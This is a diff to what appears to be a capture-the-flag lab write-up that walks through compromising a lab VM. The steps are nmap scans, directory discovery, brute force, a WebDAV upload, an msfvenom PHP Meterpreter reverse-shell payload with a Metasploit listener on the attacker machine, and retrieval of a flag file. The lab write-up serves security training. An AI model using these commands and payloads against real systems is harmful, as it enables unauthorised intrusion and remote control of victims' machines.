@@ -32,6 +32,9 @@ Using `dirb` , as a web content scanner, we can locate hidden and existing direc
 </details>	
 
 
+
+
+
 <details>
 <summary> <b> Step 2: Locate the hidden directory on the server </b> </summary>
   
@@ -42,7 +45,19 @@ Navigating through the directory comes to a folder called secret_folder which as
 ![image](https://github.com/user-attachments/assets/80ccab65-f8a5-485b-94b4-e619354d67b4)
 
 ![image](https://github.com/user-attachments/assets/20e7518b-911e-4cf2-a8d4-511d1bb27bc1)
+
+Note: In addition to manually searching folders, we could:
+- Check the host again with ping: `nmap -pn 192.168.1.0/24`
+- Scan for open ports and versions: `nmap -sV 192.168.1.1-105`
+- On the Capstone VM (`ip:192.168.1.105`) there is one open `port:80` which is a significant vulnerability I can exploit. We also learn about the `Apache server version 2.4.29` and the `OS of Linux`
+- Checking for OS: `nmap -sS -A 192.168.1.105` 
+- `wget 192.168.1.105/meet_our_team/ashton.txt | cat ashton.txt`
+
+Another option is also to run an nmap script that can reveal hidden files and directories : `nmap --script http-enum -p80 192.168.1.105` Here `http-enum` is an NSE (Nmap scripting engine) script provides insights regarding the types of servers and applications in use within the subnet.
 </details>	
+
+
+
 
 
 <details>
@@ -73,6 +88,9 @@ We will find Asthon's username and password by brute force against the hidden di
 </details>
 
 
+
+
+
 <details>
 <summary> <b> Step 4: Connect to the server via WebDAV </b> </summary>
 
@@ -89,12 +107,19 @@ Connect to the VM's WebDAV directory by following the instructions on the secret
 </details>
 
 
+
+
+
 <details>
 <summary> <b> Step 5: Upload a PHP reverse shell payload. </b> </summary>
 
-- Using MSFVenom, we will set up a reverse shell, the command: `msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.90 LPORT=4444 -f raw > shell.php`
+To do this, on my Kali VM I can use msfvenom to create a reverse shell payload script in Kali Linux (hacker's VM). This payload when run on the victim machine (capstone VM) can extablish a retrograde connection with Kali linux on the Hacker's machine (Kali VM) and open up session and a terminal to execute additional code. This is where the Exploitation phase ends and the post-exploitation starts.
+
+Command: `msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.90 LPORT=4444 -f raw > shell.php`
 
 ![image](https://github.com/user-attachments/assets/d355def3-8daf-40bd-854d-9a28a6bd45e1)
+
+Now in Kali VM run Metasploit and run the following commands to prepare for listening and being ready to accept any retrograde connection coming from Capstone VM(victim).
 
 - Setting up a listener by following a series of command:
   - `msfconsole` to launch `msfconsole`
@@ -115,9 +140,12 @@ Connect to the VM's WebDAV directory by following the instructions on the secret
 </details>
 
 
+
+
+
 <details>
 <summary> <b> Step 6: Find and capture the flag </b> </summary>
-  
+
 Once a Meterpreter shell is open you can run the following commands like getuid, getwd, sysinfo to gather dditional information about the hacked system. If you type shell the terminal will change to shell and then you can run additional commands such as finding files etc.
   
 - On the listener, we will search for the flag found inside the root directory, which is named flag.txt
@@ -126,11 +154,8 @@ Once a Meterpreter shell is open you can run the following commands like getuid,
   - `cat /flag.txt`
 
 Note: Another way instead of jumping through files would be to: `find -name flag.txt 2>/dev/null` Here `2>dev/null` is instructing to ignore any error messages while searching.
+
 ![image](https://github.com/user-attachments/assets/3185fc42-d926-4f33-822b-0ba845715063)
-
-
-
-
 </details>
 
 
